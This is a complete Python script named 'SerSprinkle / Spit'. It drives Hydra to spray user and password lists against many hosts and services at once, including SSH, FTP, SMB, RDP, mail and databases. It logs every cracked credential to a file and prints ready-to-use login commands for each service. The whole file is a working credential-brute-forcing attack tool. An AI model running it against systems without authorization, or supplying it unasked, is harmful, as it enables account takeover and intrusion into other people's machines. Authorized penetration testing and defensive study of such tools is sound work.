#!/usr/bin/env python3

import argparse
import subprocess
import os
import shlex
import time
import datetime
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

# In-run and cross-run state
SEEN = set()      # keys written to file in this run
EXISTING = set()  # keys already present in output file (loaded at start)
PRINTED = set()   # keys already printed (uniform + hints) in this run

# Matches our own log file lines to preload EXISTING
HIT_LINE_RE = re.compile(
    r"\[\d{4}-\d{2}-\d{2}_[0-9\-:]{8,}\]\s+(\S+)\s+on\s+(\S+)\s+->\s+user='([^']+)'\s+pass='([^']+)'"
)

def parse_args():
    parser = argparse.ArgumentParser(description="SerSprinkle / Spit: Multi-service password sprayer using Hydra")
    parser.add_argument("-t", "--targets", required=True,
                        help='Path to targets file, lines like: 10.10.10.1 "ssh,ftp"')
    parser.add_argument("-u", "--users", required=True,
                        help="User or userlist file (file -> -L, single -> -l)")
    parser.add_argument("-p", "--passwords", required=True,
                        help="Password or passwordlist file (file -> -P, single -> -p)")
    parser.add_argument("--dry-run", action="store_true",
                        help="Only print hydra commands, don't execute")
    parser.add_argument("--sleep", type=float, default=0.0,
                        help="Delay between each hydra run (seconds)")
    parser.add_argument("--threads", type=int, default=1,
                        help="Number of concurrent runs (per ip/service)")
    parser.add_argument("--output", default="success.txt",
                        help="File to log successful attempts (default: success.txt)")
    return parser.parse_args()

def is_file(path):
    return os.path.isfile(path)

def parse_creds_from_hydra_line(line: str):
    """
    Extract username/password from a typical Hydra success line.
    Looks for 'login: <user>' and 'password: <pass>'.
    """
    user = None
    pwd = None
    m_user = re.search(r'login:\s*([^\s]+)', line, flags=re.IGNORECASE)
    m_pass = re.search(r'password:\s*([^\s]+)', line, flags=re.IGNORECASE)
    if m_user:
        user = m_user.group(1)
    if m_pass:
        pwd = m_pass.group(1)
    return user, pwd

def load_existing_hits(output_file: str):
    """Preload EXISTING from the log file so we don't re-log the same hit across runs."""
    if not os.path.exists(output_file):
        return
    try:
        with open(output_file, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                m = HIT_LINE_RE.search(line)
                if m:
                    service, ip, user, pwd = m.group(1), m.group(2), m.group(3), m.group(4)
                    key = f"{ip}|{service}|{user}|{pwd}"
                    EXISTING.add(key)
    except Exception:
        # If file unreadable/corrupted, ignore and proceed
        pass

def print_uniform_and_hints(ip, service, user, pwd):
    key = f"{ip}|{service}|{user}|{pwd}"
    if key in PRINTED:
        return
    PRINTED.add(key)

    # Uniform console line
    if user and pwd:
        print(f"[✓] Credentials found for {service} on {ip} -> user='{user}' pass='{pwd}'")
    else:
        print(f"[✓] Credentials found for {service} on {ip}. (Could not parse user/password cleanly)")

    # Additional helper commands for common services
    if user and pwd:
        svc = service.lower()
        if svc == "ssh":
            print(f"   → Try: ssh {user}@{ip}  # password: {pwd}")
        elif svc == "ftp":
            print(f"   → Try: ftp {ip}  # then login as {user} with password: {pwd}")
        elif svc.startswith("smb"):
            print(f"   → Try: smbclient -U '{user}%{pwd}' //{ip}/share")
        elif svc in ("smtp", "smtps"):
            print(f"   → Try: swaks --server {ip} -au '{user}' -ap '{pwd}'")
        elif svc == "rdp":
            print(f"   → Try: xfreerdp /u:{user} /p:'{pwd}' /v:{ip}")
        elif svc == "imap":
            print(f"   → Try: openssl s_client -connect {ip}:143  # then: A1 LOGIN {user} {pwd}")
        elif svc == "pop3":
            print(f"   → Try: openssl s_client -connect {ip}:110  # then: USER {user} / PASS {pwd}")
        elif svc == "mysql":
            print(f"   → Try: mysql -h {ip} -u {user} -p  # password: {pwd}")
        elif svc == "mssql":
            print(f"   → Try: mssqlclient.py {user}@{ip} -windows-auth  # pwd: {pwd}")
        elif svc == "postgres":
            print(f"   → Try: psql -h {ip} -U {user}  # password: {pwd}")

def log_success(line, output_file, ip, service):
    user, pwd = parse_creds_from_hydra_line(line)
    key = f"{ip}|{service}|{user}|{pwd}"

    # Always print the uniform line + hints
    print_uniform_and_hints(ip, service, user, pwd)

    # If we've already logged this hit (in previous runs or earlier this run), don't write it again
    if key in EXISTING or key in SEEN:
        return

    # First time: write to file and mark as seen/existing
    SEEN.add(key)
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    entry = f"[{timestamp}] {service} on {ip} -> user='{user}' pass='{pwd}'\n"

    try:
        with open(output_file, "a", encoding="utf-8") as f:
            f.write(entry)
        EXISTING.add(key)
    except Exception as e:
        print(f"[!] Failed writing to {output_file}: {e}")

def run_hydra(ip, service, user_arg, pass_arg, dry_run, sleep_time, output_file):
    cmd = ["hydra"] + user_arg + pass_arg + [ip, service]
    cmd_str = ' '.join(cmd)
    print(f"[+] Running: {cmd_str}")

    if dry_run:
        return

    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        output = (result.stdout or "") + (result.stderr or "")

        # Scan lines for success hits
        for line in output.splitlines():
            if ("login:" in line.lower()) and ("password:" in line.lower()):
                log_success(line.strip(), output_file, ip, service)

    except Exception as e:
        print(f"[!] Error running hydra: {e}")

    # Delay between runs if requested
    time.sleep(sleep_time)

def spray(targets, users, passwords, dry_run=False, sleep_time=0.0, max_threads=1, output_file="success.txt"):
    # Choose -l/-L and -p/-P based on whether args are files
    user_arg = ["-L", users] if is_file(users) else ["-l", users]
    pass_arg = ["-P", passwords] if is_file(passwords) else ["-p", passwords]

    with open(targets, "r", encoding="utf-8", errors="ignore") as f:
        targets_data = [line.strip() for line in f if line.strip()]

    task_list = []
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        for target_line in targets_data:
            try:
                parts = shlex.split(target_line)  # supports quoted "svc1,svc2"
                ip = parts[0]
                services = parts[1].split(",")
            except Exception as e:
                print(f"[!] Error parsing line: '{target_line}': {e}")
                continue

            for service in services:
                service = service.strip()
                if not service:
                    continue
                task = executor.submit(run_hydra, ip, service, user_arg, pass_arg,
                                       dry_run, sleep_time, output_file)
                task_list.append(task)

        for task in as_completed(task_list):
            pass  # wait for all

if __name__ == "__main__":
    args = parse_args()
    # Load existing hits so we never re-log the same (ip, service, user, pass)
    load_existing_hits(args.output)
    spray(
        targets=args.targets,
        users=args.users,
        passwords=args.passwords,
        dry_run=args.dry_run,
        sleep_time=args.sleep,
        max_threads=args.threads,
        output_file=args.output
    )
